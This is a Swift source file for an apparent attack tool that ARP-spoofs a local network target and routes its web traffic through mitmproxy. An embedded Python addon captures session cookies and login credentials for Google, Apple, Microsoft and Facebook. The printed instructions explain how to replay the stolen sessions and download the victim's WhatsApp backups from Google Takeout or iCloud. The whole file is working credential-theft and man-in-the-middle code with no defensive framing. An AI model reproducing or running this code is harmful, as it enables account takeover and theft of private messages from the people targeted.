import Foundation

private let cloudCookieFile = "/tmp/netcutx_cloud_cookies.txt"
private let cloudCredFile = "/tmp/netcutx_cloud_creds.txt"
private let cloudLogFile = "/tmp/netcutx_cloud.log"

private let cloudAddonScript = """
import datetime, os, json

COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_cloud_cookies.txt')
CRED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_cloud_creds.txt')
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_cloud.log')

SESSION_DOMAINS = {
    'accounts.google.com': 'Google',
    'google.com': 'Google',
    'appleid.apple.com': 'Apple',
    'icloud.com': 'Apple',
    'login.live.com': 'Microsoft',
    'login.microsoftonline.com': 'Microsoft',
    'id.facebook.com': 'Facebook',
}

def log(msg):
    with open(LOG_FILE, 'a') as f:
        f.write(f'[{datetime.datetime.now()}] {msg}\\n')

def response(flow):
    host = flow.request.pretty_host
    for domain, service in SESSION_DOMAINS.items():
        if domain in host:
            cookies = {}
            for h, v in flow.response.headers.items():
                if h.lower() == 'set-cookie':
                    parts = v.split(';')[0]
                    if '=' in parts:
                        k, val = parts.split('=', 1)
                        cookies[k.strip()] = val.strip()
            if cookies:
                entry = {
                    'ts': str(datetime.datetime.now()),
                    'service': service,
                    'host': host,
                    'url': flow.request.url,
                    'cookies': cookies,
                }
                with open(COOKIE_FILE, 'a') as f:
                    f.write(json.dumps(entry) + '\\n')
                sess_keys = [k for k in cookies.keys() if any(x in k.lower() for x in ['session', 'token', 'auth', 'sid', 'sso', 'login'])]
                if sess_keys:
                    print(f'[NETCUTX] {service} session: {host} {list(cookies.keys())}')
                    log(f'Session captured: {service} {host}')
            break

def request(flow):
    host = flow.request.pretty_host
    for domain in ['accounts.google.com', 'appleid.apple.com', 'login.live.com', 'login.microsoftonline.com']:
        if domain in host and flow.request.method == 'POST':
            form = flow.request.urlencoded_form or {}
            sensitive = {k: v for k, v in form.items() if any(x in k.lower() for x in ['email', 'pass', 'user', 'login', 'account', 'cred'])}
            if sensitive:
                with open(CRED_FILE, 'a') as f:
                    f.write(f'[{datetime.datetime.now()}] {host}{flow.request.path}\\n')
                    for k, v in sensitive.items():
                        f.write(f'  {k}={v}\\n')
                    f.write('-' * 40 + '\\n')
                log(f'Credentials: {host}')
                print(f'[NETCUTX] Creds: {host} {list(sensitive.keys())}')
            break
"""

func cloudExtract(targetIP: String, interface: String? = nil) {
    guard getuid() == 0 else { fail("Requires sudo"); return }

    let ifname: String
    if let provided = interface { ifname = provided }
    else if let detected = getDefaultInterface() { ifname = detected }
    else { fail("No interface detected"); return }

    guard let ourIP = getInterfaceIP(ifname) else { fail("Cannot detect IP"); return }
    guard let ourMAC = getInterfaceMAC(ifname) else { fail("Cannot detect MAC"); return }

    let proxyPort = 8080

    ok("Interface \(ifname) — \(ourIP)")
    status("Setting up MITM + cloud session hijack...")

    let bpf: NetcutxBPF
    do { bpf = try NetcutxBPF(interface: ifname) } catch {
        fail("BPF: \(error.localizedDescription)"); return
    }

    guard let gw = getGatewayIP() else { bpf.close(); fail("Cannot detect gateway"); return }
    guard let gwMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
        bpf.close(); fail("Cannot resolve gateway MAC"); return
    }
    guard let targetMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: targetIP) else {
        bpf.close(); fail("Cannot resolve target MAC"); return
    }

    ok("Gateway \(gw)")
    ok("Target \(targetIP)")

    guard let addonPath = writeScript("cloud_harvest", cloudAddonScript) else {
        bpf.close(); fail("Failed to write addon"); return
    }

    guard let proxy = runMitmproxy(port: proxyPort, addonPath: addonPath) else {
        bpf.close(); fail("mitmproxy not found. Install: brew install mitmproxy"); return
    }
    ok("mitmproxy PID \(proxy.processIdentifier)")

    _ = pfctl(["-e"])
    let anchorRules = "rdr pass on \(ifname) inet proto tcp from \(targetIP) to any port 443 -> 127.0.0.1 port \(proxyPort)\nrdr pass on \(ifname) inet proto tcp from \(targetIP) to any port 80 -> 127.0.0.1 port \(proxyPort)\n"
    try? anchorRules.write(toFile: "/tmp/netcutx_anchor.conf", atomically: true, encoding: .utf8)
    let (rc, _) = pfctl(["-a", "netcutx", "-f", "/tmp/netcutx_anchor.conf"])
    if !rc { fail("pf anchor failed"); cleanup(proxy: proxy, bpf: bpf); return }
    ok("HTTP/HTTPS → 127.0.0.1:\(proxyPort)")

    setupSignal()
    _ = setIPForwarding(true)

    var dnsSinceSend = 0
    print("")
    print("  ── Cloud Extraction Pipeline ──")
    status("Monitoring: Google, Apple, Microsoft, Facebook logins")
    status("Session cookies: \(cloudCookieFile)")
    status("Credentials: \(cloudCredFile)")
    print("")
    print("  After capture:")
    print("    1. Replay cookie → browser DevTools → Application → Cookies")
    print("    2. Go to takeout.google.com → request WhatsApp backup")
    print("    3. Or iCloud → Settings → iCloud Backup → WhatsApp")
    print("")
    print("  Press Ctrl+C to stop")
    print("")

    while _stopFlag == 0 {
        if dnsSinceSend >= 10 {
            try? bpf.send(frame: Data(ARPFrame.buildReply(
                srcMAC: ourMAC, srcIP: gw, dstMAC: targetMAC, dstIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: gw, victimMAC: targetMAC, victimIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
                srcMAC: ourMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gw).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: targetIP, victimMAC: gwMAC, victimIP: gw).bytes))
            dnsSinceSend = 0
        }

        guard let pkt = try? bpf.receive(timeout: 0.05) else { dnsSinceSend += 1; continue }
        _ = parseIPPacket(pkt.data, targetFilter: targetIP)
        dnsSinceSend += 1

        if FileManager.default.fileExists(atPath: cloudCookieFile),
           let data = try? String(contentsOfFile: cloudCookieFile), !data.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            print("")
            ok("Session cookies captured! File: \(cloudCookieFile)")
            print("")
            print(data)
            dnsSinceSend = 0
        }
        if FileManager.default.fileExists(atPath: cloudCredFile),
           let data = try? String(contentsOfFile: cloudCredFile), !data.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            print("")
            ok("Credentials captured! File: \(cloudCredFile)")
            print("")
            print(data)
            dnsSinceSend = 0
        }
    }

    _ = setIPForwarding(false)
    cleanup(proxy: proxy, bpf: bpf)
    printBackupInstructions()
}

private func writeScript(_ name: String, _ content: String) -> String? {
    try? FileManager.default.createDirectory(atPath: "/tmp/netcutx_addons", withIntermediateDirectories: true)
    let path = "/tmp/netcutx_addons/\(name).py"
    do {
        try content.write(toFile: path, atomically: true, encoding: .utf8)
        return path
    } catch {
        return nil
    }
}

private func runMitmproxy(port: Int, addonPath: String) -> Process? {
    let paths = ["/opt/homebrew/bin/mitmproxy", "/usr/local/bin/mitmproxy", "/usr/bin/mitmproxy"]
    let proxyPath = paths.first { FileManager.default.fileExists(atPath: $0) } ?? "/opt/homebrew/bin/mitmproxy"
    let proxy = Process()
    proxy.executableURL = URL(fileURLWithPath: proxyPath)
    proxy.arguments = ["-p", "\(port)", "--set", "block_global=false", "--set", "ssl_insecure=true", "-s", addonPath, "--set", "http2=false"]
    proxy.standardOutput = FileHandle.nullDevice
    proxy.standardError = FileHandle.nullDevice
    do { try proxy.run(); return proxy } catch { return nil }
}

private func cleanup(proxy: Process?, bpf: NetcutxBPF?) {
    if let p = proxy, p.isRunning { p.terminate(); p.waitUntilExit() }
    bpf?.close()
    _ = pfctl(["-a", "netcutx", "-F", "all"])
    if FileManager.default.fileExists(atPath: cloudCookieFile) { ok("Session cookies: \(cloudCookieFile)") }
    if FileManager.default.fileExists(atPath: cloudCredFile) { ok("Credentials: \(cloudCredFile)") }
}

private func printBackupInstructions() {
    print("")
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║         WhatsApp Backup Extraction           ║")
    print("  ╚══════════════════════════════════════════════╝")
    print("")
    print("  Google Drive Backup:")
    print("    1. Login ke takeout.google.com dengan session/cred")
    print("    2. Deselect all → cari 'WhatsApp'")
    print("    3. Export → download ZIP")
    print("    4. Ekstrak msgstore.db + media folder")
    print("    5. Buka: sqlite3 msgstore.db")
    print("       SELECT * FROM messages LIMIT 20;")
    print("")
    print("  iCloud Backup:")
    print("    1. Login ke icloud.com dengan session/cred")
    print("    2. Account Settings → Manage → Backups")
    print("    3. Download backup → extract WhatsApp data")
    print("    4. Butuh tools eksternal: iMazing, PhoneView")
    print("")
}
